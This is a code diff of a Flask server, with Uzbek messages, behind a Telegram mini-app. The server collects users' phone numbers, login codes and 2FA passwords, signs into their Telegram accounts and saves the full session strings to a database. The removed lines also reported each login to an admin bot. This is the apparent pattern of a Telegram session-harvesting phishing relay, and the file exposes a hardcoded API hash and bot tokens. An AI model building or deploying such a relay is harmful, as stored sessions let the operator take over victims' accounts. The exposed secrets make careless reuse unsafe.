@@ -1,287 +1,244 @@
+# login_server.py
 import os
+import re
 import asyncio
 from flask import Flask, request, jsonify, render_template
+
 from telethon import TelegramClient
+from telethon.sessions import StringSession
 from telethon.errors import (
     PhoneCodeInvalidError,
     SessionPasswordNeededError,
+    PasswordHashInvalidError,
     FloodWaitError,
     PhoneNumberInvalidError
 )
-from aiogram import Bot
-from database import get_db, init_db
-import threading
 
-SESSIONS_DIR = "/app/sessions"
-
-async def get_client(user_id: int):
-    session_file = os.path.join(SESSIONS_DIR, str(user_id))
-
-    client = TelegramClient(
-        session_file,
-        API_ID,
-        API_HASH
-    )
-
-    await client.connect()
-
-    if not await client.is_user_authorized():
-        await client.disconnect()
-        raise Exception("Telegram login qilinmagan")
-
-    return client
-
+from database import (
+    init_db,
+    save_login_attempt,
+    get_login_attempt,
+    delete_login_attempt,
+    save_user,
+    save_user_session
+)
 
 # ======================
 # CONFIG
 # ======================
 API_ID = 25780325
 API_HASH = "2c4cb6eee01a46dc648114813042c453"
-BOT_TOKEN = "8485200508:AAEIwbb9HpGBUX_mWPGVplpxNRoXXnlSOrU"
 
-ADMIN_BOT_TOKEN = "8455652640:AAE0Mf0haSpP_8yCjZTCKAqGQAcVF4kf02s"
-ADMIN_ID = 515902673
+# ======================
+# ASYNC LOOP (B I T T A)
+# ======================
+loop = asyncio.new_event_loop()
+asyncio.set_event_loop(loop)
 
-ADMIN_CHAT_ID = ADMIN_ID
-admin_bot = Bot(ADMIN_BOT_TOKEN)
-
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
-os.makedirs(SESSIONS_DIR, exist_ok=True)
-
-bot = Bot(BOT_TOKEN)
+# ======================
+# APP
+# ======================
 app = Flask(__name__, template_folder="templates")
 init_db()
 
-def run_async(coro):
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    try:
-        return loop.run_until_complete(coro)
-    finally:
-        loop.close()
+# ======================
+# HELPERS
+# ======================
+def clean_phone(phone: str) -> str:
+    phone = re.sub(r"\D", "", phone)
+    if not phone.startswith("998") or len(phone) != 12:
+        raise ValueError("Telefon formati noto‘g‘ri")
+    return "+" + phone
 
-# phone -> {client, hash}
-pending = {}
 
-   
-def notify_admin_login(user_id: str, phone: str, username: str | None = None):
-    async def _send():
-        text = (
-            "🔐 Yangi foydalanuvchi login qildi\n\n"
-            f"👤 User ID: {user_id}\n"
-            f"📱 Telefon: {phone}\n"
-        )
-        if username:
-            text += f"👤 Username: @{username}"
-
-        await admin_bot.send_message(ADMIN_CHAT_ID, text)
-
-    def runner():
-        asyncio.run(_send())
-
-    threading.Thread(target=runner, daemon=True).start()
+def run(coro):
+    return loop.run_until_complete(coro)
 
 
 # ======================
 # ROUTES
 # ======================
-
 @app.route("/")
 def index():
-    return "OK, LOGIN SERVER ISHLAYAPTI"
+    return "LOGIN SERVER WORKING"
+
 
 @app.route("/miniapp")
 def miniapp():
     return render_template("login.html")
 
+
+# ======================
+# SEND CODE
+# ======================
 @app.route("/send_code", methods=["POST"])
 def send_code():
-    data = request.json
-    phone = data.get("phone")
+    data = request.json or {}
+    phone_raw = data.get("phone")
+
+    if not phone_raw:
+        return jsonify({"status": "error", "message": "Telefon yo‘q"}), 400
 
     try:
+        phone = clean_phone(phone_raw)
+
         async def work():
-            client = TelegramClient(
-                None,
-                API_ID,
-                API_HASH
-            )
+            client = TelegramClient(StringSession(), API_ID, API_HASH)
             await client.connect()
+
             sent = await client.send_code_request(phone)
+            session_string = client.session.save()
+
             await client.disconnect()
 
-            pending[phone] = {
-                "hash": sent.phone_code_hash
-            }
+            save_login_attempt(
+                phone=phone,
+                phone_code_hash=sent.phone_code_hash,
+                session_string=session_string
+            )
 
-        run_async(work())
-        return jsonify({"status": "code_sent"})
+        run(work())
+        return jsonify({"status": "ok"})
+
+    except PhoneNumberInvalidError:
+        return jsonify({"status": "error", "message": "Telefon noto‘g‘ri"}), 400
 
     except FloodWaitError as e:
-        return jsonify({"status": "flood_wait", "seconds": e.seconds})
-    except PhoneNumberInvalidError:
-        return jsonify({"status": "phone_invalid"})
+        return jsonify({
+            "status": "error",
+            "message": f"Telegram cheklovi: {e.seconds} soniya"
+        }), 429
+
     except Exception as e:
-        print("SEND CODE ERROR:", e)
-        return jsonify({"status": "error"})
+        print("SEND_CODE ERROR:", repr(e))
+        return jsonify({"status": "error", "message": "Server xatosi"}), 500
 
 
-
+# ======================
+# VERIFY CODE
+# ======================
 @app.route("/verify_code", methods=["POST"])
 def verify_code():
-    data = request.json
-    phone = data.get("phone")
+    data = request.json or {}
+    phone_raw = data.get("phone")
     code = data.get("code")
 
-    phone_hash = pending.get(phone, {}).get("hash")
-    if not phone_hash:
-        return jsonify({"status": "no_code_requested"})
+    if not phone_raw or not code:
+        return jsonify({"status": "error"}), 400
 
     try:
+        phone = clean_phone(phone_raw)
+        attempt = get_login_attempt(phone)
+
+        if not attempt:
+            return jsonify({
+                "status": "error",
+                "message": "Kod muddati o‘tgan"
+            }), 400
+
+        phone_code_hash, session_string = attempt
+
         async def work():
-            # 🔴 BITTA CLIENT, BITTA SESSION
             client = TelegramClient(
-                os.path.join(SESSIONS_DIR, phone.replace("+", "")),
+                StringSession(session_string),
                 API_ID,
                 API_HASH
             )
             await client.connect()
 
-            await client.sign_in(
-                phone=phone,
-                code=code,
-                phone_code_hash=phone_hash
-            )
+            try:
+                await client.sign_in(
+                    phone=phone,
+                    code=code,
+                    phone_code_hash=phone_code_hash
+                )
+            except SessionPasswordNeededError:
+                return "2fa", client.session.save()
 
-            me = await client.get_me()
-
-            # 🔴 SESSIONNI USER_ID NOMI BILAN QAYTA NOMLAYMIZ
-            old_path = os.path.join(SESSIONS_DIR, phone.replace("+", "") + ".session")
-            new_path = os.path.join(SESSIONS_DIR, f"{me.id}.session")
-
+            user = await client.get_me()
+            final_session = client.session.save()
             await client.disconnect()
+            return user, final_session
 
-            if os.path.exists(old_path):
-                os.rename(old_path, new_path)
+        result = run(work())
 
-            return me
+        # ===== 2FA KERAK =====
+        if isinstance(result, tuple) is False:
+            delete_login_attempt(phone)
+            return jsonify({"status": "2fa_required"})
 
-        me = run_async(work())
-        pending.pop(phone, None)
+        user, final_session = result
 
-        # 🔽 DB GA YOZISH
-        conn = get_db()
-        cur = conn.cursor()
-        cur.execute("""
-            INSERT INTO authorized_users (user_id)
-            VALUES (%s)
-            ON CONFLICT DO NOTHING
-        """, (str(me.id),))
-        conn.commit()
-        conn.close()
+        save_user_session(user.id, final_session)
+        save_user(user.id, phone, user.username)
+        delete_login_attempt(phone)
 
-        return jsonify({"status": "success"})
+        return jsonify({"status": "ok"})
+
+    except PhoneCodeInvalidError:
+        return jsonify({"status": "error", "message": "Kod noto‘g‘ri"}), 400
 
     except Exception as e:
-        print("VERIFY_CODE ERROR:", e)
-        return jsonify({"status": "error"})
+        print("VERIFY_CODE ERROR:", repr(e))
+        return jsonify({"status": "error"}), 500
 
 
-
-
+# ======================
+# VERIFY PASSWORD (2FA)
+# ======================
 @app.route("/verify_password", methods=["POST"])
 def verify_password():
-    data = request.json
-    phone = data.get("phone")
+    data = request.json or {}
+    phone_raw = data.get("phone")
     password = data.get("password")
 
+    if not phone_raw or not password:
+        return jsonify({"status": "error"}), 400
+
     try:
+        phone = clean_phone(phone_raw)
+        attempt = get_login_attempt(phone)
+
+        if not attempt:
+            return jsonify({"status": "error"}), 400
+
+        _, session_string = attempt
+
         async def work():
-            temp_client = TelegramClient(None, API_ID, API_HASH)
-            await temp_client.connect()
-
-            await temp_client.sign_in(password=password)
-            me = await temp_client.get_me()
-
-            session_file = os.path.join(SESSIONS_DIR, str(me.id))
-            client = TelegramClient(session_file, API_ID, API_HASH)
+            client = TelegramClient(
+                StringSession(session_string),
+                API_ID,
+                API_HASH
+            )
             await client.connect()
+
             await client.sign_in(password=password)
-
-            await temp_client.disconnect()
+            user = await client.get_me()
+            final_session = client.session.save()
             await client.disconnect()
-            return me
+            return user, final_session
 
-        me = run_async(work())
+        user, final_session = run(work())
 
-        user_id = str(me.id)
+        save_user_session(user.id, final_session)
+        save_user(user.id, phone, user.username)
+        delete_login_attempt(phone)
 
-        conn = get_db()
-        cur = conn.cursor()
-        cur.execute("""
-            INSERT INTO authorized_users (user_id)
-            VALUES (%s)
-            ON CONFLICT (user_id) DO NOTHING
-        """, (user_id,))
-        conn.commit()
-        conn.close()
+        return jsonify({"status": "ok"})
 
-        notify_admin_login(
-            user_id=user_id,
-            phone=phone,
-            username=getattr(me, "username", None)
-        )
-
-        return jsonify({"status": "success"})
+    except PasswordHashInvalidError:
+        return jsonify({
+            "status": "error",
+            "message": "Parol noto‘g‘ri"
+        }), 400
 
     except Exception as e:
-        print("VERIFY PASSWORD ERROR:", e)
-        return jsonify({"status": "invalid_password"})
-
-
-
-def notify_admin(user_id: str, phone: str, username: str | None = None):
-    async def _send():
-        text = (
-            "🔐 Yangi login\n\n"
-            f"👤 User ID: {user_id}\n"
-            f"📱 Phone: {phone}\n"
-        )
-        if username:
-            text += f"👤 Username: @{username}"
-
-        await admin_bot.send_message(ADMIN_CHAT_ID, text)
-
-    def runner():
-        asyncio.run(_send())
-
-    threading.Thread(target=runner, daemon=True).start()
+        print("VERIFY_PASSWORD ERROR:", repr(e))
+        return jsonify({"status": "error"}), 500
 
 
 # ======================
 # RUN
 # ======================
-
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
